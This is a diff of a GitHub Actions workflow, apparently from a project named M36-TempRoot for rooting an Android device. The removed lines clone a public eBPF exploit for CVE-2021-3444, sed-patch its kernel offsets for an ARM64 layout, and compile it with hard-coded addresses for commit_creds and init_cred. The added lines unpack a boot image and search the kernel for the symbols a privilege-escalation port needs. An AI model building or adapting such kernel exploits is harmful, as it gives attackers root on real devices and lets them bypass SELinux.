@@ -1,50 +1,33 @@
-name: build_ebpf_lpe_kmalloc512
+name: check_4_19_symbols
 on: [push, workflow_dispatch]
 
 jobs:
-  build:
-    runs-on: ubuntu-24.04-arm
+  check:
+    runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout M36-TempRoot
+        uses: actions/checkout@v4
 
-      - name: Install dependencies
+      - name: Prepare kernel.elf
         run: |
-          sudo apt-get update -y
-          sudo apt-get install -y gcc make git
+          unzip boot_a.zip
+          git clone https://android.googlesource.com/platform/system/tools/mkbootimg
+          PYTHONPATH=mkbootimg python3 mkbootimg/unpack_bootimg.py --boot_img boot_a.img --out boot_unpacked
+          cd boot_unpacked
+          cp kernel kernel_raw.gz && gunzip kernel_raw.gz
+          pip3 install vmlinux-to-elf
+          vmlinux-to-elf kernel_raw kernel.elf
 
-      - name: Clone and patch exploit for kmalloc-512
+      - name: Search for all symbols the 4.19 port needs
         run: |
-          git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
-          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
+          cd boot_unpacked
+          echo "=== ashmem / configfs / pipe / symbols ==="
+          nm kernel.elf | grep -iE "ashmem_misc|ashmem_fops|ashmem_ioctl|ashmem_mmap|ashmem_open|ashmem_release|ashmem_show_fdinfo|configfs_read_file|configfs_write_bin_file|generic_file_splice_read|noop_llseek|anon_pipe_buf_ops" || echo "--- SOME MISSING ---"
           
-          echo "=== Before patch ==="
-          grep -E "KERNEL_BASE|BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OUTER_MAX_ENTRIES|OPS_OFFSET" exploit.c
+          echo ""
+          echo "=== init_task / selinux / kmalloc / slide ==="
+          nm kernel.elf | grep -iE "init_task|init_uts_ns|empty_zero_page|root_task_group|selinux_state|security_hook_heads|kmalloc_caches|nfulnl_logger|sysctl_bootid" || echo "--- SOME MISSING ---"
           
-          # Patch for ARM64 kmalloc-512 layout
-          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
-          sed -i 's|#define BPF_ARRAY_VALUE_OFFSET 208|#define BPF_ARRAY_VALUE_OFFSET 320|' exploit.c
-          sed -i 's|#define MAP_VALUE_SIZE 256|#define MAP_VALUE_SIZE 128|' exploit.c
-          sed -i 's|#define OUTER_MAX_ENTRIES 32|#define OUTER_MAX_ENTRIES 16|' exploit.c
-          sed -i 's|#define OPS_OFFSET 304|#define OPS_OFFSET 192|' exploit.c
-          
-          echo "=== After patch ==="
-          grep -E "KERNEL_BASE|BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OUTER_MAX_ENTRIES|OPS_OFFSET" exploit.c
-
-      - name: Compile
-        run: |
-          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
-          gcc -static -O2 -I ../../../common/include \
-            -DDYN_ARRAY_MAP_OPS=0xffffff8008f5d500ULL \
-            -DDYN_ARRAY_OF_MAPS_MAP_OPS=0xffffff8008f5d780ULL \
-            -DDYN_FD_ARRAY_MAP_DELETE_ELEM=0xffffff80081d6cecULL \
-            -DDYN_COMMIT_CREDS=0xffffff80080e03dcULL \
-            -DDYN_INIT_CRED=0xffffff8009787f48ULL \
-            exploit.c -o exploit
-          
-          file exploit
-          ls -la exploit
-
-      - uses: actions/upload-artifact@v4
-        with:
-          name: ebpf-lpe-512
-          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit
+          echo ""
+          echo "=== commit_creds / init_cred ==="
+          nm kernel.elf | grep -iE "commit_creds|init_cred|prepare_kernel_cred" || echo "--- MISSING ---"
